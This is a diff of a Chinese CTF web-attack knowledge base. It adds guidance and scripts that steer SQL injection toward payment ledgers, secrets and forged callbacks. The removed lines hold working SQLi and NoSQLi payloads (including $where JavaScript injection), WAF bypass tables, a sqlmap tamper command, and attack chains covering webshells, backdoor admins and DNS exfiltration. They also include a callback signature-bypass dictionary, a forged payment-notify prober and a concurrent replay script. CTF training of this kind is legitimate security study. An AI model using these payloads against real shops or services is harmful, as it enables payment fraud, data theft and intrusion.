@@ -6448,9 +6448,81 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 
 # SQLi & NoSQLi (数据库注入高阶实战)
 
-数据库注入是 Web 对抗中的经典主线，但在 CTF 和现代 Web 对抗中，我们通常需要面对**过滤器/WAF**、**无回显盲注**以及 **NoSQL（如 MongoDB）** 架构。本指南侧重于高阶利用与 Bypass 策略。
+数据库注入是 Web 对抗中的经典主线，但在 CTF 和现代 Web 对抗中，我们通常需要面对**过滤器/WAF**、**无回显盲注**、**业务账本错位**以及 **NoSQL（如 MongoDB）** 架构。本指南侧重于高阶利用与 Bypass 策略，并把 SQLi 直接接到支付、订单、权益、配置和后台入口。
 
 ---
+
+## 0. 注入到业务账本的路线图
+
+先不要急着 `UNION SELECT database()`。拿到一个注入点后，先判断它落在哪张表、能不能触达业务状态。如果目标是支付类题，最短路径通常不是拖完整库，而是定位 `orders/payments/entitlements/wallet/coupons` 这几张表的字段关系。
+
+| 入口信号 | 第一层目标 | 进阶目标 | 命中标志 |
+|---|---|---|---|
+| URL 参数、GraphQL 参数、搜索框报 SQL 错 | DBMS / 当前库 / 表名 | `orders`, `payments`, `users`, `entitlements` | 表名、列名、订单状态字段可枚举 |
+| 支付回调字段参与查询 | `out_trade_no`, `transaction_id` | 回调绑定任意订单或重复流水 | pending → paid、权益到账 |
+| 优惠券/卡密/邀请码查询 | `coupons`, `cdkeys`, `redeem_logs` | 读未使用码、改 used 状态、重复兑换 | 卡密/优惠券/flag 出现 |
+| 盲注只给真假/时间 | 当前用户、订单号、余额 | 二分提取关键字段，不拖大表 | 稳定前缀推进、ledger diff |
+| NoSQL 登录/筛选 | 用户对象、订单对象 | `$regex` 提取 token / role / order_id | 登录态、订单详情、下载链接 |
+
+```mermaid
+flowchart TD
+  Entry["注入点"] --> Fingerprint["DBMS / 解析器 / 回显 oracle"]
+  Fingerprint --> Schema["表与列: users/orders/payments/entitlements"]
+  Schema --> Extract["抽关键字段: order_id/status/amount/user_id/sign_key"]
+  Extract --> Pay["支付链: 回调/状态机/权益发放"]
+  Pay --> Flag["flag / 卡密 / VIP / 余额"]
+  Extract --> Config["配置链: DB key / APP_KEY / JWT secret"]
+  Config --> Admin["后台 / token / RCE 下一跳"]
+```
+
+### 0.1 支付账本字段优先级
+
+| 优先级 | 字段/表 | 为什么先打 |
+|---|---|---|
+| 1 | `orders(id,out_trade_no,user_id,status,amount,currency)` | 定位订单归属和金额源 |
+| 2 | `payments(order_id,transaction_id,paid_amount,provider,status)` | 找回调和幂等键 |
+| 3 | `entitlements(user_id,order_id,sku,vip_until,download_key)` | 证明权益是否到账 |
+| 4 | `wallet_logs/coupon_logs/refund_logs` | 找余额、优惠和退款分叉 |
+| 5 | `settings/config/options` | 找支付密钥、JWT secret、后台开关 |
+
+### 0.2 最小账本映射脚本
+
+```python
+# ledger_schema_mapper.py — SQLi 结果落到支付账本
+import json
+import re
+from collections import defaultdict
+
+TABLE_HINTS = {
+    "order": re.compile(r"order|trade|invoice|cart", re.I),
+    "payment": re.compile(r"pay|payment|transaction|notify|callback", re.I),
+    "entitlement": re.compile(r"vip|member|license|download|cdkey|card|quota|credit", re.I),
+    "wallet": re.compile(r"wallet|balance|coin|point|coupon|refund", re.I),
+    "config": re.compile(r"config|setting|option|secret|key|token", re.I),
+}
+
+def rank_tables(names):
+    bucket = defaultdict(list)
+    for name in names:
+        for kind, rx in TABLE_HINTS.items():
+            if rx.search(name):
+                bucket[kind].append(name)
+    return dict(bucket)
+
+def next_columns(table):
+    probes = ["id", "user_id", "order_id", "out_trade_no", "status",
+              "amount", "total_fee", "paid_amount", "transaction_id",
+              "sign", "secret", "download_key", "vip_until"]
+    return [f"{table}.{c}" for c in probes]
+
+if __name__ == "__main__":
+    tables = ["users", "orders", "payments", "payment_notify", "entitlements", "system_config"]
+    ranked = rank_tables(tables)
+    print(json.dumps(ranked, ensure_ascii=False, indent=2))
+    for group in ranked.values():
+        for t in group:
+            print(t, "=>", next_columns(t))
+```
 
 ## 1. SQL 注入高级 Bypass 技巧
 
@@ -6695,113 +6767,7 @@ SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) END FROM DUAL;  -- 时间盲注
 MONGO_OPS = {
     "$ne": "", "$gt": "", "$gte": "", "$lt": "", "$lte": "",
     "$in": ["admin"], "$nin": ["guest"],
-    "$regex": "^a",            # 逐字符爆破
-    "$where": "sleep(5000)",   # JS 执行 (旧版)
-    "$exists": True,           # 探测字段
-    "$type": 2,                # 字段类型 (2=String)
-}
 
-# 嵌套绕过 (过滤器只检查顶层 key)
-{"user": {"$gt": ""}, "password": {"$gt": ""}}
-
-# $where JS 注入
-{"$where": "this.role=='admin'"}
-{"$where": "this.constructor.constructor('return process')()"}
-```
-
----
-
-## 9. WAF Bypass 全表
-
-```python
-# 空格替代
-["/**/", "%09", "%0a", "%0d", "%0b", "%0c", "%a0", "%00"]
-
-# 关键字混淆
-SELECT → SeLeCt, SEL/**/ECT, %53%45%4c%45%43%54, SE{LECT (MySQL)
-
-# 等号替代
-= → LIKE, REGEXP, BETWEEN, IN, >, <, IS NOT NULL, SOUNDS LIKE
-
-# 注释
--- , #, /**/, ;%00, --%20%2b
-
-# 逗号替代
-SUBSTR(col FROM 1 FOR 1) 替代 SUBSTR(col,1,1)
-LIMIT 1 OFFSET 0         替代 LIMIT 0,1
-UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b  替代 UNION SELECT 1,2
-```
-
-### Cloud WAF 专项绕过
-
-```python
-# Cloudflare: 通常不拦纯 SQL 关键字组合
-# 绕过关键: 避开 SQL 注入检测特征 (function(args))
-# Cloudflare 检查: sleep(, benchmark(, substr(, ascii(
-# 替代品:
-#   SLEEP(N)       → GET_LOCK('a', N), 重复计算 BOMB()
-#   SUBSTR(a,1,1)  → MID(a,1,1) / LEFT(a,1) / RIGHT(a,1)
-#   ASCII()        → ORD()
-
-# AWS WAF: SQL injection rule 检查关键词排列
-# 绕过: 内联注释 /*!50000SELECT*/ (MySQL版本注释)
-
-# ModSecurity:
-# 绕过: 分段传输 encoding 差异
-#   Content-Type: multipart/form-data + charset=ibm500 (EBCDIC编码)
-```
-
-```bash
-# sqlmap WAF 绕过 — tamper 链
-sqlmap -u "..." --tamper="space2comment,charencode,percentage,randomcase,equaltolike" --technique=BEU --dbs
-```
-
----
-
-## 10. 攻击链
-
-```
-SQLi →读用户表 → 管理员密码 hash → crack → 管理后台登录
-SQLi → 读配置文件 (LOAD_FILE) → DB 密码 → 内网横向
-SQLi → UDF/OUTFILE → 写 webshell → RCE
-SQLi → stacked query → INSERT 后门管理员 → 持久化
-SQLi → OOB DNS → 逐字节外带 flag → 无回显完成
-NoSQLi $regex → 逐字符爆破 JWT secret → JWT 伪造 → Admin API
-SQLi → INFORMATION_SCHEMA → 发现其他应用 DB → 跨库攻击
-```
-
-## 11. Content-Type Smuggling for SQLi (WAFFLED)
-
-```python
-# WAFFLED-style: 修改 Content-Type → WAF 按 form 解析 (低优先级检查)
-# → 但后端按 JSON/XML 解析 → 注入通过
-
-SMUGGLE_HEADERS = {
-    "Content-Type": [
-        "application/json; charset=utf-8",     # 标准 JSON
-        "application/x-www-form-urlencoded",    # WAF form check
-        "multipart/form-data; boundary=x",      # WAF 认为 multipart
-        "text/plain; charset=utf-8",            # WAF 忽略
-        "application/xml",                      # 后端可能解析为 JSON
-    ]
-}
-
-def content_type_smuggling_sqli(target: str, sqli_payload: str):
-    """测试不同 Content-Type 下的 SQLi 是否被 WAF 拦截"""
-    for ct in SMUGGLE_HEADERS["Content-Type"]:
-        r = requests.post(target, data=sqli_payload, headers={"Content-Type": ct})
-        if r.status_code not in (403, 406):
-            print(f"  {ct}: {r.status_code}")
-```
-
-## 12. Polyglot SQLi Payloads
-
-```sql
--- 一个 payload, 在多种 SQL 方言中都有效
--- MySQL + PostgreSQL + MSSQL 通用:
-1'/**/OR/**/1=1/**/--
-1' UNION SELECT 1,2,3 FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c --
-0'XOR(if(now()=sysdate(),sleep(5),0))XOR'  -- MySQL SLEEP + 其他 DB
 
 [... content truncated for size ...]
 
@@ -14322,6 +14288,73 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 }
 ```
 
+### 0.2 SQLi/NoSQLi 驱动的支付账本复原
+
+如果前面已经从 `../03-injection/sqli-nosqli.md` 抽到表名、列名或部分订单字段，不要把它当成单独成果。支付题要把 DB 证据落回六张表：订单、流水、权益、余额、优惠、配置。
+
+| 抽到的内容 | 立即转化成什么动作 | 命中信号 |
+|---|---|---|
+| `orders.id/out_trade_no` | 双账号 IDOR、回调绑定、发货接口 | 非所有者订单可读/可发货 |
+| `orders.amount/payments.paid_amount` | 改金额、低价 intent、金额核对差异 | paid 金额与订单金额不一致 |
+| `payments.transaction_id/notify_id` | 幂等重放、跨订单复用、空白/大小写变体 | 同一订单多次权益 |
+| `settings.pay_secret/webhook_secret` | 生成签名回调、测试签名覆盖字段 | notify 从 fail 变 success |
+| `entitlements.download_key/license_key` | 直接领数字商品、枚举邻近资源 | 下载链接/卡密/flag |
+| `coupon_logs/wallet_logs` | 优惠叠加、余额负数、退款残留 | 余额或折扣非预期增加 |
+
+```python
+# sql_to_payment_router.py — 把 SQLi 结果转成支付下一跳
+import json
+import re
+
+ROUTES = [
+    (re.compile(r"out_trade_no|order_id|orders?\.", re.I), "order_idor_or_callback_bind"),
+    (re.compile(r"transaction_id|notify_id|payments?\.", re.I), "notify_replay_or_idempotency"),
+    (re.compile(r"pay_secret|webhook_secret|sign_key|app_key", re.I), "signed_callback_forge"),
+    (re.compile(r"license|download|cdkey|entitlement", re.I), "digital_goods_delivery"),
+    (re.compile(r"coupon|wallet|balance|refund", re.I), "coupon_wallet_refund_chain"),
+]
+
+def route_sqli_finding(finding):
+    text = json.dumps(finding, ensure_ascii=False)
+    hits = [name for rx, name in ROUTES if rx.search(text)]
+    return hits or ["schema_more_columns"]
+
+sample = {
+    "table": "payments",
+    "columns": ["order_id", "transaction_id", "paid_amount", "status"],
+    "row": {"order_id": "1001", "transaction_id": "TX20260704001"}
+}
+print(route_sqli_finding(sample))
+```
+
+### 0.3 账本字段的“谁说了算”
+
+支付链的核心问题是哪个字段被信任。SQLi/备份泄露/API 回显能帮你直接定位“谁说了算”：
+
+| 业务问题 | 看哪张表/字段 | 常见错位 |
+|---|---|---|
+| 发货看什么状态 | `orders.status` / `payments.status` / `delivery.status` | 回调只改流水，发货只读订单 |
+| 金额以谁为准 | `orders.amount` / `payments.paid_amount` / `gateway_amount` | 支付 0.01，订单仍按 100 发货 |
+| 幂等靠哪个键 | `transaction_id` / `notify_id` / `order_id` | 新 notify_id 旧 transaction_id 重放 |
+| 权益何时生成 | `entitlements.created_at` / `delivery_logs` | pending 时已生成卡密 |
+| 退款是否回收权益 | `refund_logs.status` / `entitlements.revoked_at` | refund success 后 VIP 仍有效 |
+
+```python
+# ledger_authority_diff.py — 判断状态由哪本账驱动
+def classify_authority(before, after):
+    changes = []
+    for book in ["order", "payment", "delivery", "entitlement", "wallet"]:
+        if before.get(book) != after.get(book):
+            changes.append(book)
+    if "payment" in changes and "order" not in changes:
+        return "payment_only_changed"
+    if "order" in changes and "entitlement" in changes:
+        return "order_drives_delivery"
+    if "wallet" in changes and "payment" not in changes:
+        return "wallet_side_effect_without_payment"
+    return "+".join(changes) or "no_state_change"
+```
+
 ### 首轮黑盒记录模板
 
 ```md
@@ -14561,114 +14594,7 @@ def try_status(order_id):
 
 支付回调如果只看 `order_id` 和 `status`，通常就能从这些字段拆开打：
 
-- Provider 签名：`sign`, `signature`, `X-Signature`, `Wechatpay-Signature`, `Stripe-Signature`
-- `out_trade_no/order_id` 与本地订单绑定
-- `total_amount/amount` 与本地订单金额一致
-- `seller_id/app_id/mch_id` 与配置一致
-- `trade_status` 只允许成功终态
-- 回调幂等：同一 `transaction_id` 只能处理一次
-
-### 4.2 签名绕过字典
-
-```text
-sign=
-sign=invalid
-sign=0
-sign=null
-sign[]=x
-signature=
-signature=undefined
-X-Signature:
-X-Signature: invalid
-Content-Type: application/x-www-form-urlencoded
-Content-Type: application/json
-```
-
-### 4.3 回调伪造探针
-
-```python
-import requests, itertools, time
-
-BASE = "https://target"
-S = requests.Session()
-
-notify_paths = ["/notify", "/callback", "/payment/notify", "/api/payment/notify", "/webhook/pay"]
-payloads = [
-    {"out_trade_no": "ORDER_ID", "order_id": "ORDER_ID", "trade_status": "TRADE_SUCCESS", "total_amount": "0.01", "sign": ""},
-    {"out_trade_no": "ORDER_ID", "status": "success", "amount": "0.01", "signature": "invalid"},
-    {"order_id": "ORDER_ID", "paid": True, "transaction_id": "replay-001"},
-]
-headers = [
-    {"Content-Type": "application/json"},
-    {"Content-Type": "application/x-www-form-urlencoded"},
-    {"X-Signature": ""},
-    {"X-Signature": "invalid"},
-]
-
-for path, body, hdr in itertools.product(notify_paths, payloads, headers):
-    r = S.post(BASE + path, json=body if "json" in hdr.get("Content-Type", "") else None,
-               data=body if "form" in hdr.get("Content-Type", "") else None,
-               headers=hdr, timeout=15, allow_redirects=False)
-    print(path, hdr, r.status_code, len(r.content), r.text[:200])
-    time.sleep(0.1)
-```
-
-**确认标准**：伪造回调后订单从 pending 变 paid，或权益/余额/订阅增加。
-
-## 5. 幂等与并发
-
-支付类最常见 flag 路径：重复处理同一事件。
-
-| 场景 | 漏洞 | 结果 |
-|---|---|---|
-| 重复 notify | 缺 transaction/order 幂等锁 | 重复发放权益 |
-| 支付成功 + 取消/退款竞态 | 状态机无事务 | paid 仍退款或退款后仍发货 |
-| 修改订单金额 + 支付 | create/pay 分离 | 低价支付高价商品 |
-| 并发优惠券 | 缺唯一约束 | 折扣重复叠加 |
-| 并发领取账号/卡密 | 库存扣减非原子 | 一份库存多人拿 |
-
-并发骨架：
-
-```python
-import concurrent.futures, requests, time
-
-BASE = "https://target"
-S = requests.Session()
-
-def hit(i):
-    r = S.post(BASE + "/api/payment/notify",
-               json={"order_id": "ORDER_ID", "status": "success", "transaction_id": "same-tx"},
-               timeout=20)
-    return i, r.status_code, len(r.content), r.text[:120]
-
-with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex:
-    futs = [ex.submit(hit, i) for i in range(60)]
-    for f in concurrent.futures.as_completed(futs):
-        print(f.result())
-```
-
-验证时必须比较：
-
-1. 并发前订单/余额/权益。
-2. 并发响应状态。
-3. 并发后订单/余额/权益。
-4. 是否生成 flag/卡密/订阅。
-
-## 6. 订单 IDOR / 越权支付
-
-### 6.1 攻击面
-
-- 查看他人订单：`GET /orders/{id}`
-- 支付他人订单：`POST /orders/{id}/pay`
-- 取消/退款他人订单：`POST /orders/{id}/refund`
-- 领取他人权益：`GET /orders/{id}/deliver`
-- 用自己支付回调绑定他人 `order_id`
-
-### 6.2 双账号矩阵
-
-支付题最好准备两个普通账号：
-
-| 操作 | A 订单 | B sess
+- Provid
 
 [... content truncated for size ...]
 
